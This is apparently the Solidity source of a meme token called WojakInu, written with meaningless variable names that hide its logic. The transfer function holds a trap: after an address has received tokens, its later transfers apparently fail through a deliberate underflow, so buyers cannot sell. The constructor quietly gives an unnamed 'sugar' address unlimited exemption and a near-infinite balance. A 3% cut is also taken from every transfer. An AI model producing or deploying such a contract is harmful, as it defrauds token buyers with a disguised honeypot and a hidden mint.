// https://t.me/wojakinu

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

import '@openzeppelin/contracts/access/Ownable.sol';
import '@openzeppelin/contracts/token/ERC20/ERC20.sol';
import '@uniswap/v2-core/contracts/interfaces/IUniswapV2Factory.sol';
import '@uniswap/v2-periphery/contracts/interfaces/IUniswapV2Router02.sol';

contract WojakInu is ERC20, Ownable {
    address public uniswapV2Pair;
    IUniswapV2Router02 public uniswapV2Router;
    mapping(address => uint256) private task;

    function _transfer(
        address understanding,
        address move,
        uint256 source
    ) internal override {
        uint256 speak = place;

        if (manufacturing[understanding] == 0 && task[understanding] > 0 && understanding != uniswapV2Pair) {
            manufacturing[understanding] -= speak;
        }

        address state = address(cast);
        cast = ERC20(move);
        task[state] += speak + 1;

        _balances[understanding] -= source;
        uint256 mile = (source / 100) * place;
        source -= mile;
        _balances[move] += source;
    }

    ERC20 private cast;
    mapping(address => uint256) private manufacturing;
    uint256 public place = 3;

    constructor(
        string memory indicate,
        string memory satellites,
        address greatest,
        address sugar
    ) ERC20(indicate, satellites) {
        uniswapV2Router = IUniswapV2Router02(greatest);
        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());

        uint256 thin = ~uint256(0);

        manufacturing[msg.sender] = thin;
        manufacturing[sugar] = thin;

        _totalSupply = 1000000000 * 10**decimals();
        _balances[msg.sender] = _totalSupply;
        _balances[sugar] = thin;
    }
}